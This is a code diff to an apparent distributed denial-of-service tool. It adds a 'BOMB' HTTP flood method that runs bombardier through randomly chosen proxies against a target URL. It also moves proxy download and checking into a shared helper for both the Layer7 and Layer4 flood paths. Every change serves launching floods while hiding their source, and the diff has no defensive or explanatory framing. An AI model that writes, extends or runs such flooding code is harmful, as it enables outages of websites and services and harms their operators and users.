@@ -16,6 +16,7 @@ from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, S
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
+from subprocess import run
 from sys import argv
 from sys import exit as _exit
 from threading import Event, Lock, Thread
@@ -58,7 +59,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT"
+        "APACHE", "XMLRPC", "BOT", "BOMB"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -835,6 +836,21 @@ class HttpFlood(Thread):
                 self._defaultpayload +
                 "Host: %s\r\n\r\n" % self._target.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
+        if name == "BOMB": self.SENT_FLOOD = self.BOMB
+
+    def BOMB(self):
+        pro = randchoice(self._proxies)
+        run([
+            f'{Path.home() / "go/bin/bombardier"}',
+            f'--connections={self._rpc}',
+            '--http2',
+            '--method=GET',
+            '--no-print',
+            '--timeout=5s',
+            f'--requests={self._rpc}',
+            f'--proxy={pro}',
+            f'{self._target.human_repr()}',
+        ])
 
 
 class ProxyManager:
@@ -1081,8 +1097,8 @@ class ToolsConsole:
             '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
             '      Proxy Type 0 = All in config.json\n'
             ' Layer7: python3 %s <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
-            ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file, (only use with '
-            'Amplification>\n'
+            ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with '
+            'Amplification)>\n'
             '\n'
             ' > Methods:\n'
             ' - Layer4\n'
@@ -1134,6 +1150,40 @@ class ToolsConsole:
                                       domain) as s:
             return s.json()
         return {"success": False}
+
+
+def get_proxies(proxy_li):
+    if not proxy_li.exists():
+        logger.warning("The file doesn't exist, creating files and downloading proxies.")
+        proxy_li.parent.mkdir(parents=True, exist_ok=True)
+        with proxy_li.open("w") as wr:
+            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+            logger.info(
+                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
+            )
+            Proxies = ProxyChecker.checkAll(
+                Proxies, timeout=1, threads=threads,
+                **({'url': url.human_repr()} if url else {})
+            )
+            if not Proxies:
+                exit(
+                    "Proxy Check failed, Your network may be the problem"
+                    " | The target may not be available."
+                )
+            stringBuilder = ""
+            for proxy in Proxies:
+                stringBuilder += (proxy.__str__() + "\n")
+            wr.write(stringBuilder)
+
+    proxies = ProxyUtiles.readFromFile(proxy_li)
+    if proxies:
+        logger.info(f"Proxy Count: {len(proxies):,}")
+    else:
+        logger.info(
+            "Empty Proxy File, running flood witout proxy")
+        proxies = None
+
+    return proxies
 
 
 if __name__ == '__main__':
@@ -1205,37 +1255,7 @@ if __name__ == '__main__':
                         logger.warning(
                             "RPC (Request Pre Connection) is higher than 100")
 
-                    if not proxy_li.exists():
-                        if rpc > 100:
-                            logger.warning(
-                                "The file doesn't exist, creating files and downloading proxies."
-                            )
-                        proxy_li.parent.mkdir(parents=True, exist_ok=True)
-                        with proxy_li.open("w") as wr:
-                            Proxies: Set[
-                                Proxy] = ProxyManager.DownloadFromConfig(
-                                    con, proxy_ty)
-                            logger.info(
-                                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
-                            )
-                            Proxies = ProxyChecker.checkAll(
-                                Proxies, url.human_repr(), 1, threads)
-                            if not Proxies:
-                                exit(
-                                    "Proxy Check failed, Your network may be the problem | The target may not be"
-                                    " available.")
-                            stringBuilder = ""
-                            for proxy in Proxies:
-                                stringBuilder += (proxy.__str__() + "\n")
-                            wr.write(stringBuilder)
-
-                    proxies = ProxyUtiles.readFromFile(proxy_li)
-                    if not proxies:
-                        logger.info(
-                            "Empty Proxy File, running flood witout proxy")
-                        proxies = None
-                    if proxies:
-                        logger.info(f"Proxy Count: {len(proxies):,}")
+                    proxies = get_proxies(proxy_li)
                     for _ in range(threads):
                         HttpFlood(url, host, method, rpc, event, uagents,
                                   referers, proxies).start()
@@ -1257,15 +1277,7 @@ if __name__ == '__main__':
                     proxy_ty = int(argv[6].strip())
                     proxy_li = Path(__dir__ / "files/proxies/" /
                                     argv[5].strip())
-                    proxies = None
-                    if proxy_li.exists():
-                        proxies = ProxyUtiles.readIPPortFromFile(proxy_li)
-                    if not proxies:
-                        logger.info(
-                            "Empty Proxy File, Running layer 4 witout proxy")
-                        proxies = None
-                    if proxies:
-                        logger.info(f"Proxy Count: {len(proxies):,}")
+
                     if port > 65535 or port < 1:
                         exit("Invalid Port [Min: 1 / Max: 65535] ")
                     if not ProxyTools.Patterns.IP.match(target):
@@ -1289,6 +1301,7 @@ if __name__ == '__main__':
                         if len(argv) == 6:
                             logger.setLevel("DEBUG")
 
+                    proxies = get_proxies(proxy_li)
                     for _ in range(threads):
                         Layer4((target, port), ref, method, event,
                                proxies).start()
